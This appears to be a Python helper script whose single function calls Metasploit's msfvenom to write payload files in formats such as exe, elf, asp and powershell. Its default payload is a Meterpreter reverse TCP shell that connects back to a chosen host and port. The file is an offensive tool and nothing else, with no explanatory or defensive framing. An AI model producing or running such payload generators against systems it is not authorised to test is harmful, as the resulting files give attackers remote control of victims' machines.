import subprocess
import logging
from pathlib import Path

def generate_msfvenom_payload(lhost: str, lport: int,
                             payload_type: str = "windows/meterpreter/reverse_tcp",
                             format: str = "exe") -> bool:
    supported_formats = {"exe", "python", "c", "raw", "elf", "asp", "jar", "powershell"}

    if format not in supported_formats:
        logging.error(f"Unsupported format: {format}")
        return False

    output_file = Path(f"payload.{format}")
    if output_file.exists():
        logging.warning(f"Overwriting existing file: {output_file}")

    cmd = [
        "msfvenom",
        "-p", payload_type,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", format,
        "-o", str(output_file)
    ]

    try:
        subprocess.run(cmd, check=True)
        logging.info(f"Payload generated successfully: {output_file}")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Error generating msfvenom payload: {e}")
        return False
    except FileNotFoundError:
        logging.error("msfvenom not found. Make sure Metasploit is installed and msfvenom is in your PATH.")
        return False
